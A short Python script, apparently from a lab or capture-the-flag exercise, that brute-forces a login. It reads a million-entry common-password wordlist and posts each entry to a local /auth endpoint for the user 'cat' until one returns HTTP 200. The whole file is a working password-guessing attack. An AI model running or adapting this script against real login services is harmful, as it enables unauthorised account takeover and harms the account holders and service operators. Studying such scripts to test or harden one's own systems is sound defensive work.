#!/usr/bin/env python3

import requests

with open('10-million-password-list-top-1000000.txt') as f:
    content = f.read()


passwords = content.split('\n')
for password in passwords:
    response = requests.post(
            'http://127.0.0.1:4000/auth', json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print('SUCCESS', password)
        break

# print(passwords[:10])
